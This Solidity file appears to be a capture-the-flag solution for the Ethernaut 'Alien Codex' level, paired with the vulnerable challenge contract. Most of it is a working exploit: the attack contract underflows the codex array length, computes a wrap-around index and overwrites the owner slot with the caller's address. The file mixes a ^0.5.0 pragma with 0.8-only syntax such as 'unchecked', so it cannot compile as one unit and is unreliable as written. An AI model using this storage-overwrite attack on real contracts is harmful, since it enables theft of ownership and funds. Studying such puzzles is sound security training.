// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title 19. ALIEN CODEX
 * @dev Claim ownership to complete the level.
 */

/* 
STORAGE:
=========
slot[0]: address private owner;
slot[0]: bool public contact;
slot[1]: codex.length;
*/

// The retract function decreases the codex array's length without checking if the array is empty.
// In Solidity versions prior to 0.6.0, array length is stored as an unsigned integer;
// thus, subtracting 1 from 0 causes an underflow, setting the array length to its maximum value (2^256 - 1).

interface IAlienCodex {
    function owner() external returns (address);

    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Ethernaut_AlienCodex {
    IAlienCodex private alienCodex =
        IAlienCodex(0xE57dAB9816371BEcC0E4fA092eb7FBE7C39365a6); // Replace with your Alien Codex instance

    constructor() {
        alienCodex.makeContact();
        alienCodex.retract(); // Array length underflow, length is now: 2^256 - 1 (meaning access to all storage slots)
        bytes32 hash = keccak256(abi.encode(1)); // Hash the array's length's slot
        uint256 i;

        // Bypass underflow check in solidity ^0.8.0
        unchecked {
            i -= uint256(hash);
        }

        // Overrwrite owner's address with our address (passed as bytes32)
        alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(alienCodex.owner() == msg.sender, "Hack failed");
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
